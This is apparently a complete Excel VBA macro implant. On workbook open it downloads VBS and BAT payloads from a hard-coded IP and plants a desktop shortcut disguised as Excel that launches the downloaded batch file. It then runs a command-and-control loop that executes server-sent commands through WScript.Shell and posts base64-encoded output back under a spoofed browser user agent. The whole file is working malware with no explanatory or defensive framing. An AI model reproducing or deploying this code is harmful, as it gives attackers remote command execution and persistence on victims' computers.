'c2 option
Function RunCommand(command As String) As String

    'handle error
    On Error GoTo error
    
     'first create outlook object
    Set objOL = CreateObject("Outlook.Application")
    
    'create Shell object under the oulook object
    Set WshShell = objOL.CreateObject("Wscript.Shell")
    
    'execute the command from the new shell object
     Set WshShellExec = WshShell.Exec(command)
     
     'read the output of the command
     RunCommand = WshShellExec.StdOut.ReadAll
     
Done:
   Exit Function
   
   'some error handling in case of un-recognized command error:
error:
   RunCommand = "ERROR"

End Function

Function EncodeBase64(text$)
    Dim b
    With CreateObject("ADODB.Stream")
        .Open: .Type = 2: .Charset = "utf-8"
        .WriteText text: .Position = 0: .Type = 1: b = .Read
        With CreateObject("Microsoft.XMLDOM").createElement("b64")
            .DataType = "bin.base64": .nodeTypedValue = b
            EncodeBase64 = Replace(Mid(.text, 5), vbLf, "")
        End With
        .Close
    End With
End Function

Function SendtoServer(Url As String)
    Dim replyTXT As String
    Dim Data As String
    Dim en_Data As String
    
    Data = "START"
    
    'start loop of the receive + run new commands, stop the session when recived "STOP" command
    Do While replyTXT <> "STOP"
        
        'Send command result to server, similar to SendtoServer
        Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
        objHTTP.SetTimeouts 1000000, 1000000, 1000000, 1000000
        'set the c2 IP and Port
        'Url = "http://10.25.0.23:80"
        'send the data as POST request
        objHTTP.Open "POST", Url, False
        
        'set user agent to look more like natural traffic
        objHTTP.SetRequestHeader "User-Agent", "Mozilla/4.0(compatible; MSIE 6.0; Windows NT 5.0)"
        
        'send the data enscrypt
        en_Data = EncodeBase64(Data)
        objHTTP.Send (en_Data)
        
        'Test Response
        'MsgBox objHTTP.ResponseText
        
        'recieve the new command from the respone
        replyTXT = objHTTP.ResponseText

        'run the new command
        Data = RunCommand(replyTXT)
        
    'continue with the loop of recieve-run new commands
    Loop
Done:
    Exit Function
        
End Function

' get the VBScript file from Server
Function GetVBSfromServer(Url As String)
    Dim xHttp
    Dim bStrm
    Dim filename
    Set xHttp = CreateObject("Microsoft.XMLHTTP")

    xHttp.Open "GET", Url, False
    xHttp.Send
    Set bStrm = CreateObject("Adodb.Stream")
    With bStrm
        .Open
        .Type = 1 '//binary
        .write xHttp.responseBody
        .SaveToFile "C:\Users\Public\Documents\VBS_MACRO", 2 '//overwrite
        .Close
    End With
    Name "C:\Users\Public\Documents\VBS_MACRO" As "C:\Users\Public\Documents\VBS_MACRO.vbs"
End Function

'get the bat file from the server
Function GetBATfromServer(Url As String)
    Dim xHttp
    Dim bStrm
    Dim filename
    Set xHttp = CreateObject("Microsoft.XMLHTTP")
    xHttp.Open "GET", Url, False
    xHttp.Send
    Set bStrm = CreateObject("Adodb.Stream")
    With bStrm
        .Open
        .Type = 1 '//binary
        .write xHttp.responseBody
        .SaveToFile "C:\Users\Public\Documents\BAT_EXCEL_VBS_MACRO", 2 '//overwrite
        .Close
    End With
     Name "C:\Users\Public\Documents\BAT_EXCEL_VBS_MACRO" As "C:\Users\Public\Documents\BAT_EXCEL_VBS_MACRO.bat"
End Function

' Function to create LNK file for fake Excel
Function LNKcreateFakeExcel()

    'create Shell object under the oulook object
    Set objOL = CreateObject("Outlook.Application")
    Set wshell = objOL.CreateObject("WScript.Shell")

    Dim path
    path = wshell.SpecialFolders("Desktop") & "/Fake Excel.lnk"
    
    Set shortcut = wshell.CreateShortcut(path)

    ' Location of the the icon Excel
    shortcut.IconLocation = "C:\Program Files\Microsoft Office\root\vfs\Windows\Installer\{90160000-000F-0000-1000-0000000FF1CE}\xlicons.exe,0"

    shortcut.WindowStyle = 4

    ' Target of the shortcut is the bat file Macro GET from the server
    shortcut.TargetPath = "C:\Users\Public\Documents\BAT_EXCEL_VBS_MACRO.bat"
    
    ' Make the shortcut look like real Excel
    shortcut.Description = "Umožnuje snadno pracovat s daty, analyzovat je a vizualizovat a výstupy potom sdílet s ostatními."

    shortcut.Save

End Function


'this function is called when the workbook is opened
Sub Workbook_Open()

     'handle error
    On Error GoTo error
    'host = "http://127.0.0.1:80"
    host = "http://10.100.1.24:80"
    ' GetVBSfromServer ("http://192.168.0.102:80/VBS_MACRO.vbs")

    ' GetBATfromServer ("http://192.168.0.102:80/BAT_EXCEL_VBS_MACRO.bat")

    GetVBSfromServer (host & "/VBS_MACRO.vbs")
    GetBATfromServer (host & "/BAT_EXCEL_VBS_MACRO.bat")

    ActiveWorkbook.SaveAs "C:\Users\Public\Documents\C2.xlsm"

    Call LNKcreateFakeExcel

    SendtoServer (host)
    
error:
     SendtoServer (host)
    
    
End Sub



